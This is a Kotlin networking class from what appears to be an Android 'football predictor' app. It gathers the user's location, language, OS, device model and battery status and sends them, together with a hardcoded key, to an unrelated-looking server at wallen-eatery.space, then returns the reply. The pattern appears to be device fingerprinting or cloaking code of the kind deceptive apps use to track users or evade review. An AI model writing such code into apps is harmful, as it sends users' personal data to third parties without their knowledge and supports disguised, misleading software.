package com.apps.footbalpredictor.hsgrjs.network

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class NetworkManager {
    
    companion object {
        private const val TAG = "NetworkManager"
        private const val BASE_ENDPOINT = "https://wallen-eatery.space/a-vdm-3/server.php"
    }
    
    suspend fun fetchServerResponse(
        os: String,
        language: String,
        location: String,
        deviceModel: String,
        batteryStatus: String,
        batteryLevel: String
    ): String? = withContext(Dispatchers.IO) {
        var connection: HttpURLConnection? = null
        try {
            val queryParams = buildQueryParameters(
                os, language, location, deviceModel, batteryStatus, batteryLevel
            )
            val fullEndpoint = "$BASE_ENDPOINT?$queryParams"
            
            Log.d(TAG, "Making request to: $fullEndpoint")
            
            val networkAddress = URL(fullEndpoint)
            connection = networkAddress.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            
            val responseCode = connection.responseCode
            Log.d(TAG, "Response code: $responseCode")
            
            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = reader.use { it.readText() }
                Log.d(TAG, "Response received: $response")
                return@withContext response
            } else {
                Log.e(TAG, "Server returned error code: $responseCode")
                return@withContext null
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error making network request", e)
            return@withContext null
        } finally {
            connection?.disconnect()
        }
    }
    
    private fun buildQueryParameters(
        os: String,
        language: String,
        location: String,
        deviceModel: String,
        batteryStatus: String,
        batteryLevel: String
    ): String {
        return "p=Jh675eYuunk85" +
                "&os=${encodeValue(os)}" +
                "&lng=${encodeValue(language)}" +
                "&loc=${encodeValue(location)}" +
                "&devicemodel=${encodeValue(deviceModel)}" +
                "&bs=${encodeValue(batteryStatus)}" +
				"&bl=${batteryLevel}"
    }
    
    private fun encodeValue(value: String): String {
        return java.net.URLEncoder.encode(value, "UTF-8").replace("+", "%20")
    }
}
